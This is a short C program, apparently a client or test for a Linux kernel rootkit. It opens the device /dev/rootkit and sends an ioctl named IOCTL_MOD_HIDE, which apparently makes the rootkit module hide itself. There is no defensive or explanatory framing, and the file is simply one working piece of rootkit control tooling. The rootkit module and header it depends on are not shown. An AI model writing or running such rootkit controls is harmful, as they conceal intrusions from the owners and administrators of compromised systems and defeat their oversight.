#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <string.h>
#include <assert.h>
#include "rootkit.h"

int main() {
    int fd = open("/dev/rootkit", O_RDWR);
    assert(fd != -1);
    assert(ioctl(fd, IOCTL_MOD_HIDE) == 0);
    assert(close(fd) == 0);
    return 0;
}